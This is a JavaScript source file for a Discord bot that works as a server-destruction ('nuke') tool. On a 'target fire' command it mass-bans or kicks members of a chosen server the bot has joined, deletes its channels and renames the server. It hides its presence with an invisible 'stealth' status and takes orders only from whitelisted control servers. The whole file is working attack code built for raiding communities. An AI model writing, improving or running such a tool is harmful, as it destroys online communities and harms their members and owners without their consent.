import { ButtonBuilder, ButtonStyle, Client, Component, EmbedBuilder, Guild, InteractionType } from "discord.js"
import { ActionRowBuilder } from "@discordjs/builders";

import { createCommand, getCommands, runCommand } from "./commands.js"

import { config } from "dotenv"
config({
    quiet: true
})

let canceled = false;
let hyperspaced = false;

/**
 * @param {Guild} target
 */
async function fire(target) {
    if(canceled) return "Canceled."
    if(whitelistGuilds.includes(target.id)) return "Invalid target."

    const members = await target.members.fetch();
    for(const memberData of members) {
        if(whitelistUsers.includes(memberData[0])) continue
        const member = memberData[1]
        try {
            if(member.id == client.user.id) continue;
            if(member.bannable) {
                informationChannel.send(`Banned ${(member.ban({reason: Math.random() * 9999999999999})).displayName}.`)
            } else {
                if(member.kickable) {
                    informationChannel.send(`Kicked ${(member.kick(Math.random() * 9999999999999)).displayName}.`)
                } else {
                    informationChannel.send(`Couldn't kick or ban ${member.displayName}.`)
                    member.setNickname("charred remains")
                }
            }
        } catch {
            informationChannel.send(`Error with user ${member.displayName}.`)
        }
    }
    const channels = await target.channels.fetch();
    for(const channelData of channels) {
        const channel = channelData[1];
        if(channel.name.endsWith("-immune")) continue
        try {
            if(channel.deletable) {
                informationChannel.send(`Deleted channel ${(await channel.delete(Math.random() * 9999999999999)).name}.`)
            } else {
                informationChannel.send(`Couldn't deleted channel ${channel.name}.`)
                channel.setName("Charred remains")
            }
        } catch {
            informationChannel.send(`Error with channel ${channel.name}.`)
        }
    }
    try {
        target.setName("Charred remains")
    } catch {
        informationChannel.send(`Cant set target name ${target.name}.`)
    }
    return "Target destroyed!"
}

createCommand("help", "Displays this message.", (message, ...args) => {
    const embed = new EmbedBuilder()
        .setTitle("Commands:")
    for(const command of getCommands()) {
        embed.addFields({
            name: command.name,
            value: command.description
        })
    }

    message.reply({
        embeds: [embed]
    })
})

createCommand("target", "Lists or fires on a target.\nOptions: list, fire <target id or name>", async(message, ...args) => {
    switch(args[0]) {
        case "list": {
            const embed = new EmbedBuilder()
                .setTitle("Servers:")
            for(const guildData of await client.guilds.fetch()) {
                const guild = guildData[1]
                embed.addFields({
                    name: guild.name,
                    value: guild.owner ? `owner: ${guild.owner}\n` : null + guild.id ? `id: ${guild.id}\n` : null
                })
            }

            message.reply({
                embeds: [embed]
            })
            break;
        }
        case "fire": {
            const guilds = await client.guilds.fetch();
            const target = await guilds.find(g => args[1] == g.name || args[1] == g.id).fetch()
            if(target) {
                if(whitelistGuilds.includes(target.id)) {
                    return `Invalid target "${args[1]}"`
                } else {
                    const row = new ActionRowBuilder()
                        .addComponents(
                            new ButtonBuilder({
                                custom_id: "cancel",
                                style: ButtonStyle.Danger,
                                label: "Cancel"
                            }),
                            new ButtonBuilder({
                                custom_id: "hyperspace",
                                style: ButtonStyle.Danger,
                                label: "Hyperspace"
                            })
                        )
                    let timer = 60
                    const embed = new EmbedBuilder()
                        .setTitle(`Target: ${target.name}\nGetting into position.\nTime left: ${timer}`)
                    const fireMessage = await message.reply({ content: "", embeds: [embed], components: [row] })

                    const countDownInterval = setInterval(async()=>{
                        if(canceled) {
                            clearInterval(countDownInterval);
                            embed.setTitle(`Target: ${target.name}\nCanceled.`)
                            fireMessage.edit({ content: "", embeds: [embed], components: [] }).catch((err)=>{
                                if(err.rawError.code == "10008") {
                                    cancelError = true
                                }
                            })
                            return
                        }
                        timer-=3
                        if(timer <= 0 || hyperspaced) {
                            embed.setTitle(`Target: ${target.name}\nFiring!`)
                            let cancelError = false;
                            fireMessage.edit({ content: "", embeds: [embed], components: [] }).catch((err)=>{
                                if(err.rawError.code == "10008") {
                                    cancelError = true
                                }
                            })
                            clearInterval(countDownInterval);
                            if(!cancelError) {
                                const result = await fire(target);

                                embed.setTitle(`Target: ${target.name}\n${result}`)
                                fireMessage.edit({ content: "", embeds: [embed], components: [] }).catch((err)=>{
                                    if(err.rawError.code == "10008") {
                                        clearInterval(countDownInterval);
                                    }
                                })
                            }
                        } else {
                            embed.setTitle(`Target: ${target.name}\nGetting into position.\nTime left: ${timer}`)
                            fireMessage.edit({ content: "", embeds: [embed], components: [row] }).catch((err)=>{
                                if(err.rawError.code == "10008") {
                                    clearInterval(countDownInterval);
                                }
                            })
                        }
                    }, 3000)
                }
            } else {
                return `Invalid target "${args[1]}"`
            }
            break;
        }
    }
})

createCommand("stealth", "sets stealth.\noptions: on, off", (message, ...args)=>{
    switch(args[0]) {
        case "on": {
            client.user.setStatus("invisible")
            return "Stealth enabled."
        }
        case "off": {
            client.user.setStatus("online")
            return "Stealth disabled."
        }
        default: {
            client.user.setStatus("invisible")
            return "Stealth enabled."
        }
    }
})

const client = new Client({
    intents: [
        "GuildBans",
        "Guilds",
        "GuildMembers",
        "GuildMessages",
        "GuildMessageReactions",
        "MessageContent"
    ]
})

client.on("clientReady", async()=>{
    client.user.setStatus("invisible")
    console.log(`Command Ready`)
    informationChannel = await client.channels.fetch(informationChannelID);
})

client.on("interactionCreate", (interaction)=>{
    if(interaction.isButton()) {
        switch(interaction.customId) {
            case "cancel": {
                canceled = true;
                interaction.message.edit({content: "Canceling.", components: [], embeds: []})
                break
            }
            case "hyperspace": {
                hyperspaced = true;
                interaction.message.edit({content: "Hyperspacing.", components: [], embeds: []})
                break
            }
        }
    }
})

client.on("messageCreate", async(message)=>{
    if(message.author.id == client.user.id) return;
    if(whitelistGuilds.includes(message.guildId)) {
        const result = await runCommand(message);

        if(result) {
            message.reply(result).catch(()=>{
                message.channel.send(result);
            })
        }
    }
})

client.login(process.env.TOKEN)